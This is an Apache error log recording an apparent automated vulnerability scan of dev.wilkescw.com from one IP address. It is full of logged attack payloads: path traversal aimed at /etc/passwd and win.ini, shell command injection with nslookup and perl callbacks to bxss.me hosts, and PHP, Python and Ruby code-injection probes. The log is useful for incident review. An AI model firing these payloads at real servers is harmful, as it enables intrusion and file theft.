[Wed Jul 07 19:28:01.588028 2021] [core:error] [pid 14375] (36)File name too long: [client 27.147.202.214:4321] AH00036: access to /js/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/dev.wilkescw.com/js/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Wed Jul 07 19:28:02.680964 2021] [core:error] [pid 14367] (36)File name too long: [client 27.147.202.214:1455] AH00036: access to /;(nslookup hittzlpusvpoj208a3.bxss.me||perl -e "gethostbyname('hittzlpusvpoj208a3.bxss.me')")|(nslookup hittzlpusvpoj208a3.bxss.me||perl -e "gethostbyname('hittzlpusvpoj208a3.bxss.me')")&(nslookup hittzlpusvpoj208a3.bxss.me||perl -e "gethostbyname('hittzlpusvpoj208a3.bxss.me')")/bootstrap.min.js failed (filesystem path '/var/www/html/dev.wilkescw.com/;(nslookup hittzlpusvpoj208a3.bxss.me||perl -e "gethostbyname('hittzlpusvpoj208a3.bxss.me')")|(nslookup hittzlpusvpoj208a3.bxss.me||perl -e "gethostbyname('hittzlpusvpoj208a3.bxss.me')")&(nslookup hittzlpusvpoj208a3.bxss.me||perl -e "gethostbyname('hittzlpusvpoj208a3.bxss.me')")')
[Wed Jul 07 19:28:03.075783 2021] [php7:error] [pid 14332] [client 27.147.202.214:9998] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:03.298127 2021] [core:error] [pid 14798] (36)File name too long: [client 27.147.202.214:2586] AH00036: access to /;(nslookup hitbihtodjvkya2c3a.bxss.me||perl -e "gethostbyname('hitbihtodjvkya2c3a.bxss.me')")|(nslookup hitbihtodjvkya2c3a.bxss.me||perl -e "gethostbyname('hitbihtodjvkya2c3a.bxss.me')")&(nslookup hitbihtodjvkya2c3a.bxss.me||perl -e "gethostbyname('hitbihtodjvkya2c3a.bxss.me')")/custom.js failed (filesystem path '/var/www/html/dev.wilkescw.com/;(nslookup hitbihtodjvkya2c3a.bxss.me||perl -e "gethostbyname('hitbihtodjvkya2c3a.bxss.me')")|(nslookup hitbihtodjvkya2c3a.bxss.me||perl -e "gethostbyname('hitbihtodjvkya2c3a.bxss.me')")&(nslookup hitbihtodjvkya2c3a.bxss.me||perl -e "gethostbyname('hitbihtodjvkya2c3a.bxss.me')")')
[Wed Jul 07 19:28:04.748413 2021] [php7:error] [pid 14332] [client 27.147.202.214:9998] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:05.968087 2021] [php7:error] [pid 14331] [client 27.147.202.214:12377] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/admin/classes.php?978274@
[Wed Jul 07 19:28:06.239552 2021] [core:error] [pid 14810] [client 27.147.202.214:6122] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Wed Jul 07 19:28:06.571329 2021] [core:error] [pid 14413] [client 27.147.202.214:12373] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Wed Jul 07 19:28:06.776837 2021] [core:error] [pid 14467] (36)File name too long: [client 27.147.202.214:9996] AH00036: access to /;(nslookup hitoatqxpxoxrab0f9.bxss.me||perl -e "gethostbyname('hitoatqxpxoxrab0f9.bxss.me')")|(nslookup hitoatqxpxoxrab0f9.bxss.me||perl -e "gethostbyname('hitoatqxpxoxrab0f9.bxss.me')")&(nslookup hitoatqxpxoxrab0f9.bxss.me||perl -e "gethostbyname('hitoatqxpxoxrab0f9.bxss.me')")/bootstrap.min.css failed (filesystem path '/var/www/html/dev.wilkescw.com/;(nslookup hitoatqxpxoxrab0f9.bxss.me||perl -e "gethostbyname('hitoatqxpxoxrab0f9.bxss.me')")|(nslookup hitoatqxpxoxrab0f9.bxss.me||perl -e "gethostbyname('hitoatqxpxoxrab0f9.bxss.me')")&(nslookup hitoatqxpxoxrab0f9.bxss.me||perl -e "gethostbyname('hitoatqxpxoxrab0f9.bxss.me')")')
[Wed Jul 07 19:28:06.971211 2021] [php7:error] [pid 14332] [client 27.147.202.214:9998] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:07.265821 2021] [php7:error] [pid 14331] [client 27.147.202.214:12377] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/admin/classes.php?id=916343@
[Wed Jul 07 19:28:07.914440 2021] [authz_core:error] [pid 14339] [client 27.147.202.214:1451] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/files/.htaccess~
[Wed Jul 07 19:28:08.239773 2021] [authz_core:error] [pid 14339] [client 27.147.202.214:1451] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/files/.htaccess.old
[Wed Jul 07 19:28:08.564177 2021] [authz_core:error] [pid 14339] [client 27.147.202.214:1451] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/files/.htaccess.save
[Wed Jul 07 19:28:09.703797 2021] [negotiation:error] [pid 14457] [client 27.147.202.214:1621] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/dev.wilkescw.com/admin/faculty (None could be negotiated).
[Wed Jul 07 19:28:10.042242 2021] [core:error] [pid 14381] (36)File name too long: [client 27.147.202.214:2511] AH00036: access to /css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/dev.wilkescw.com/css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Wed Jul 07 19:28:10.495241 2021] [php7:error] [pid 14332] [client 27.147.202.214:9998] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:10.695164 2021] [php7:error] [pid 14799] [client 27.147.202.214:4212] script '/var/www/html/dev.wilkescw.com/admin/response.write(9819995*9015627).php' not found or unable to stat
[Wed Jul 07 19:28:10.992032 2021] [php7:error] [pid 14365] [client 27.147.202.214:1608] script '/var/www/html/dev.wilkescw.com/admin/'+response.write(9819995*9015627)+'.php' not found or unable to stat
[Wed Jul 07 19:28:11.030990 2021] [php7:error] [pid 14798] [client 27.147.202.214:2586] script '/var/www/html/dev.wilkescw.com/admin/lSqHlJAg.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:11.323479 2021] [php7:error] [pid 14780] [client 27.147.202.214:2505] script '/var/www/html/dev.wilkescw.com/admin/"+response.write(9819995*9015627)+".php' not found or unable to stat
[Wed Jul 07 19:28:11.520502 2021] [php7:error] [pid 14332] [client 27.147.202.214:9998] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:11.603386 2021] [php7:error] [pid 14456] [client 27.147.202.214:6233] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:11.813725 2021] [core:error] [pid 14798] (36)File name too long: [client 27.147.202.214:2586] AH00036: access to /;(nslookup hitpzrbvtulnt63e98.bxss.me||perl -e "gethostbyname('hitpzrbvtulnt63e98.bxss.me')")|(nslookup hitpzrbvtulnt63e98.bxss.me||perl -e "gethostbyname('hitpzrbvtulnt63e98.bxss.me')")&(nslookup hitpzrbvtulnt63e98.bxss.me||perl -e "gethostbyname('hitpzrbvtulnt63e98.bxss.me')")/font-awesome.min.css failed (filesystem path '/var/www/html/dev.wilkescw.com/;(nslookup hitpzrbvtulnt63e98.bxss.me||perl -e "gethostbyname('hitpzrbvtulnt63e98.bxss.me')")|(nslookup hitpzrbvtulnt63e98.bxss.me||perl -e "gethostbyname('hitpzrbvtulnt63e98.bxss.me')")&(nslookup hitpzrbvtulnt63e98.bxss.me||perl -e "gethostbyname('hitpzrbvtulnt63e98.bxss.me')")')
[Wed Jul 07 19:28:11.984106 2021] [php7:error] [pid 14780] [client 27.147.202.214:2505] script '/var/www/html/dev.wilkescw.com/admin/error&n956477=v939212.php' not found or unable to stat
[Wed Jul 07 19:28:12.838979 2021] [authz_core:error] [pid 14457] [client 27.147.202.214:1621] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/admin/.php, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:12.974766 2021] [php7:error] [pid 14797] [client 27.147.202.214:6197] script '/var/www/html/dev.wilkescw.com/admin/).php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:13.045452 2021] [core:error] [pid 14356] [client 27.147.202.214:14837] AH00126: Invalid URI in request GET /icons//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:28:13.289733 2021] [php7:error] [pid 14493] [client 27.147.202.214:9984] script '/var/www/html/dev.wilkescw.com/admin/!(()&&!|*|*|.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:13.345097 2021] [core:error] [pid 14798] (36)File name too long: [client 27.147.202.214:2586] AH00036: access to /css/;(nslookup hitkeomnwqtrje0039.bxss.me||perl -e "gethostbyname('hitkeomnwqtrje0039.bxss.me')")|(nslookup hitkeomnwqtrje0039.bxss.me||perl -e "gethostbyname('hitkeomnwqtrje0039.bxss.me')")&(nslookup hitkeomnwqtrje0039.bxss.me||perl -e "gethostbyname('hitkeomnwqtrje0039.bxss.me')").css failed (filesystem path '/var/www/html/dev.wilkescw.com/css/;(nslookup hitkeomnwqtrje0039.bxss.me||perl -e "gethostbyname('hitkeomnwqtrje0039.bxss.me')")|(nslookup hitkeomnwqtrje0039.bxss.me||perl -e "gethostbyname('hitkeomnwqtrje0039.bxss.me')")&(nslookup hitkeomnwqtrje0039.bxss.me||perl -e "gethostbyname('hitkeomnwqtrje0039.bxss.me')").css')
[Wed Jul 07 19:28:13.530228 2021] [php7:error] [pid 14332] [client 27.147.202.214:9998] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:13.593056 2021] [php7:error] [pid 14456] [client 27.147.202.214:6233] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:13.781805 2021] [core:error] [pid 14798] [client 27.147.202.214:2586] AH00126: Invalid URI in request GET /icons//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:28:13.939237 2021] [php7:error] [pid 14780] [client 27.147.202.214:2505] script '/var/www/html/dev.wilkescw.com/admin/;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));.php' not found or unable to stat
[Wed Jul 07 19:28:14.165930 2021] [php7:error] [pid 14493] [client 27.147.202.214:9984] script '/var/www/html/dev.wilkescw.com/admin/^(#$!@#$)(()))******.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:14.260639 2021] [php7:error] [pid 14780] [client 27.147.202.214:2505] script '/var/www/html/dev.wilkescw.com/admin/';print(md5(31337));$a='.php' not found or unable to stat
[Wed Jul 07 19:28:14.299201 2021] [php7:error] [pid 14797] [client 27.147.202.214:6197] script '/var/www/html/dev.wilkescw.com/admin/bxss.me.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:14.543981 2021] [php7:error] [pid 14332] [client 27.147.202.214:9998] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:14.581843 2021] [php7:error] [pid 14780] [client 27.147.202.214:2505] script '/var/www/html/dev.wilkescw.com/admin/";print(md5(31337));$a=".php' not found or unable to stat
[Wed Jul 07 19:28:14.830281 2021] [php7:error] [pid 14493] [client 27.147.202.214:9984] script '/var/www/html/dev.wilkescw.com/admin/))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))).php' not found or unable to stat
[Wed Jul 07 19:28:14.839251 2021] [core:error] [pid 14808] [client 27.147.202.214:1072] AH00126: Invalid URI in request GET /js//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:28:15.164741 2021] [core:error] [pid 14799] [client 27.147.202.214:4212] AH00126: Invalid URI in request GET /js//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:28:15.238094 2021] [core:error] [pid 14815] (36)File name too long: [client 27.147.202.214:6250] AH00036: access to /css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/dev.wilkescw.com/css/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Wed Jul 07 19:28:15.457386 2021] [php7:error] [pid 14493] [client 27.147.202.214:9984] script '/var/www/html/dev.wilkescw.com/admin/1trL5aqnO.php' not found or unable to stat
[Wed Jul 07 19:28:15.508791 2021] [php7:error] [pid 14456] [client 27.147.202.214:6233] script '/var/www/html/dev.wilkescw.com/admin/'".php' not found or unable to stat
[Wed Jul 07 19:28:15.620115 2021] [php7:error] [pid 14488] [client 27.147.202.214:4203] script '/var/www/html/dev.wilkescw.com/admin/str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitjfaxgdqrtd4fb98.'+'bxss.me').php' not found or unable to stat
[Wed Jul 07 19:28:15.845987 2021] [core:error] [pid 14373] (36)File name too long: [client 27.147.202.214:3358] AH00036: access to /;(nslookup hitgttsjigxuub12fa.bxss.me||perl -e "gethostbyname('hitgttsjigxuub12fa.bxss.me')")|(nslookup hitgttsjigxuub12fa.bxss.me||perl -e "gethostbyname('hitgttsjigxuub12fa.bxss.me')")&(nslookup hitgttsjigxuub12fa.bxss.me||perl -e "gethostbyname('hitgttsjigxuub12fa.bxss.me')")/error.php failed (filesystem path '/var/www/html/dev.wilkescw.com/;(nslookup hitgttsjigxuub12fa.bxss.me||perl -e "gethostbyname('hitgttsjigxuub12fa.bxss.me')")|(nslookup hitgttsjigxuub12fa.bxss.me||perl -e "gethostbyname('hitgttsjigxuub12fa.bxss.me')")&(nslookup hitgttsjigxuub12fa.bxss.me||perl -e "gethostbyname('hitgttsjigxuub12fa.bxss.me')")')
[Wed Jul 07 19:28:15.848081 2021] [php7:error] [pid 14456] [client 27.147.202.214:6233] script '/var/www/html/dev.wilkescw.com/admin/<!--.php' not found or unable to stat
[Wed Jul 07 19:28:15.885080 2021] [php7:error] [pid 14384] [client 27.147.202.214:3290] script '/var/www/html/dev.wilkescw.com/admin/'.gethostbyname(lc('hitrd'.'zrqxberb3e304.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(114).chr(74).chr(100).chr(89).'.php' not found or unable to stat
[Wed Jul 07 19:28:15.954240 2021] [php7:error] [pid 14359] [client 27.147.202.214:1142] script '/var/www/html/dev.wilkescw.com/admin/'+str(__import__("time").sleep(9))+__import__("socket").gethostbyname("hitjfaxgdqrtd4fb98."+"bxss.me")+'.php' not found or unable to stat
[Wed Jul 07 19:28:16.224711 2021] [php7:error] [pid 14332] [client 27.147.202.214:9998] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:16.225348 2021] [php7:error] [pid 14467] [client 27.147.202.214:9996] script '/var/www/html/dev.wilkescw.com/admin/"+"A".concat(70-3).concat(22*4).concat(121).concat(68).concat(119).concat(85)+(require"socket"\nSocket.gethostbyname("hitru"+"roqfvzuy7877f.bxss.me.")[3].to_s)+".php' not found or unable to stat
[Wed Jul 07 19:28:16.293364 2021] [php7:error] [pid 14384] [client 27.147.202.214:3290] script '/var/www/html/dev.wilkescw.com/admin/"+str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitjfaxgdqrtd4fb98.'+'bxss.me')+".php' not found or unable to stat
[Wed Jul 07 19:28:16.479822 2021] [php7:error] [pid 14488] [client 27.147.202.214:4203] script '/var/www/html/dev.wilkescw.com/admin/echo tsdjjw$()\\ geidid\\nz^xyu||a #' &echo tsdjjw$()\\ geidid\\nz^xyu||a #|" &echo tsdjjw$()\\ geidid\\nz^xyu||a #.php' not found or unable to stat
[Wed Jul 07 19:28:16.506148 2021] [php7:error] [pid 14373] [client 27.147.202.214:3358] script '/var/www/html/dev.wilkescw.com/classes.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:16.721896 2021] [core:error] [pid 14457] [client 27.147.202.214:1621] AH00126: Invalid URI in request GET /icons//........................................................................../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:28:16.816152 2021] [php7:error] [pid 14488] [client 27.147.202.214:4203] script '/var/www/html/dev.wilkescw.com/admin/&echo durzfz$()\\ easehg\\nz^xyu||a #' &echo durzfz$()\\ easehg\\nz^xyu||a #|" &echo durzfz$()\\ easehg\\nz^xyu||a #.php' not found or unable to stat
[Wed Jul 07 19:28:16.866535 2021] [php7:error] [pid 14395] [client 27.147.202.214:3309] script '/var/www/html/dev.wilkescw.com/admin/'+'A'.concat(70-3).concat(22*4).concat(101).concat(66).concat(99).concat(89)+(require'socket'\nSocket.gethostbyname('hiten'+'qnrhfryuc5c6c.bxss.me.')[3].to_s)+'.php' not found or unable to stat
[Wed Jul 07 19:28:17.035962 2021] [core:error] [pid 14365] [client 27.147.202.214:1608] AH00126: Invalid URI in request GET /icons//........................................................................../../../../../../../../windows/win.ini HTTP/1.1
